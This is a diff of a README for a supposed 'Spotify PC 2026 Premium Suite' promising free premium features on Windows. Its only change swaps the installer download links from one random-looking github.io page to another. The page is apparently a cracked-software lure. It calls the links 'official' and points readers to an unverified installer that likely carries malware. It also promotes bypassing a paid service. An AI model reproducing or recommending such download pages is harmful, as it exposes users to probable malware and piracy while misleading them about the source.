@@ -2,7 +2,7 @@
 
 Welcome to the Spotify PC 2026 Premium Suite, the ultimate tool designed to enhance your desktop Spotify experience. This suite provides premium features like ad-free listening, offline downloads, and high-quality audio streaming for Windows 10 and 11 users. With a user-friendly interface and seamless integration, you can enjoy Spotify as never before in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside  
 
@@ -56,7 +56,7 @@ Here are answers to some common queries about the Spotify PC 2026 Premium Suite:
 
 To get started, download the latest version of the suite directly from our official GitHub page. We recommend always using the most recent release for optimal performance and new features.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Support and Updates  
 
